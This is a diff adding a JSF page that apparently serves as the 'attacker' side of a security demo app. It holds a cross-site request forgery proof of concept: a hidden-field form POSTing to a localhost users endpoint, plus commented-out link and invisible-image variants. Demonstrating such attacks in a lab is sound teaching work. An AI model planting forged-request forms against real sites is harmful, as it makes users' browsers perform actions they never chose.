@@ -1,0 +1,26 @@
+<ui:composition xmlns="http://www.w3.org/1999/xhtml"
+                xmlns:ui="http://java.sun.com/jsf/facelets"
+                xmlns:h="http://java.sun.com/jsf/html"
+                xmlns:f="http://java.sun.com/jsf/core"
+                template="template/template-attacker.xhtml">
+    <ui:define name="content">
+
+        <p> There is no authentication to this part of the site. </p>
+        <p> Technically they are both hosted as part of the same domain, so the same origin policy will not prevent
+        scripts from accessing data on other parts of the site. However, we are not using scripts here, just simple
+        get requests</p>
+
+       <!--<a href="http://localhost:8080/auth/users?username=philsm">View my Pictures!</a>-->
+
+        <!--<img src="http://localhost:8080/auth/users?username=philsm" width="0" height="0"/>-->
+
+        <form action='http://localhost:8080/auth/users' method='POST' name='CSRF'>
+            <input type='hidden' name='name' value='we are in'/>
+
+            <button type="submit" >Submit</button>
+        </form>
+
+
+    </ui:define>
+
+</ui:composition>
